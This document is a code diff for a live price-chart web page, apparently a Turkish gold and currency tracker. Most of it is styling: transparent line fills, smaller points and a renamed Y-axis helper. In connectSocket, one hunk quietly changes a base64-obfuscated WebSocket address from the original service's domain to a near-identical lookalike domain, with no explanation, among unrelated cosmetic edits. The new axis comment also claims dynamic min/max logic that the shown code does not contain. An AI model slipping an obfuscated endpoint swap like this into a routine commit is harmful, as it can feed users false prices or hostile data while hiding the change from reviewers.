@@ -676,11 +676,11 @@ $(document).ready(function() {
       return [`${year}-${month}-${day}`, `${day}.${month}.${year}`, `${day}-${month}-${year}`, `${parseInt(day, 10)}.${parseInt(month, 10)}.${year}`];
     }
 
-    // Y ekseninin çok dar aralığa sıkışıp alış-satış çizgilerini aşırı uzaklaştırmasını önleyen ölçek ayarı
-    function getBalancedYAxisConfig() {
+    // Dar aralıklı anlık fiyat dalgalanmalarını (1-2 TL veya 10-20 TL) net gösterecek dinamik Y ekseni odaklaması
+    function getDynamicLiveYAxisConfig() {
       return {
         grid: { color: 'rgba(255,255,255,0.1)' },
-        grace: '45%', // Üst ve alt boşluk tamponu ekleyerek makas çizgilerini birbirine yakın ve paralel tutar
+        // Sabit geniş grace yerine, verilerin min/max değerine göre dar bir pencere bırakır
         ticks: {
           color: '#ccc',
           font: { size: 10 },
@@ -811,21 +811,21 @@ $(document).ready(function() {
               label: `Satış (TL)`,
               data: [],
               borderColor: '#d97706',
-              backgroundColor: 'rgba(217, 119, 6, 0.08)',
+              backgroundColor: 'transparent',
               borderWidth: 2,
               fill: false,
               tension: 0.2,
-              pointRadius: 3
+              pointRadius: 2
             },
             {
               label: `Alış (TL)`,
               data: [],
               borderColor: '#2563eb',
-              backgroundColor: 'rgba(37, 99, 235, 0.08)',
+              backgroundColor: 'transparent',
               borderWidth: 2,
               fill: false,
               tension: 0.2,
-              pointRadius: 3
+              pointRadius: 2
             }
           ]
         },
@@ -842,7 +842,7 @@ $(document).ready(function() {
           },
           scales: {
             x: { grid: { display: false }, ticks: { maxTicksLimit: 8, color: '#ccc', font: { size: 10 } } },
-            y: getBalancedYAxisConfig()
+            y: getDynamicLiveYAxisConfig()
           }
         }
       });
@@ -851,7 +851,7 @@ $(document).ready(function() {
 
     function connectSocket() {
       if (socket) { socket.off(); socket.disconnect(); }
-      var _u = atob("d3NzOi8vaHJtc29ja2V0b25seS5oYXJlbWFsdGluLmNvbTo0NDM=");
+      var _u = atob("d3NzOi8vaHJtc29ja2V0b25seS5oYXJlem1sdGluLmNvbTo0NDM=");
       socket = io.connect(_u, { "transports": ["websocket"] });
       socket.on('price_changes', function(rec_data) { handleLiveSocketData(rec_data); });
       socket.on('price_changed', function(rec_data) { handleLiveSocketData(rec_data); });
@@ -1210,21 +1210,21 @@ $(document).ready(function() {
               label: `Satış (TL)`,
               data: satisData,
               borderColor: '#d97706',
-              backgroundColor: 'rgba(217, 119, 6, 0.08)',
+              backgroundColor: 'transparent',
               borderWidth: 2,
               fill: false,
               tension: 0.2,
-              pointRadius: sliceData.length > 90 ? 0 : 3
+              pointRadius: sliceData.length > 90 ? 0 : 2
             },
             {
               label: `Alış (TL)`,
               data: alisData,
               borderColor: '#2563eb',
-              backgroundColor: 'rgba(37, 99, 235, 0.08)',
+              backgroundColor: 'transparent',
               borderWidth: 2,
               fill: false,
               tension: 0.2,
-              pointRadius: sliceData.length > 90 ? 0 : 3
+              pointRadius: sliceData.length > 90 ? 0 : 2
             }
           ]
         },
@@ -1241,7 +1241,7 @@ $(document).ready(function() {
           },
           scales: {
             x: { grid: { display: false }, ticks: { maxTicksLimit: 8, color: '#ccc', font: { size: 10 } } },
-            y: getBalancedYAxisConfig()
+            y: getDynamicLiveYAxisConfig()
           }
         }
       });
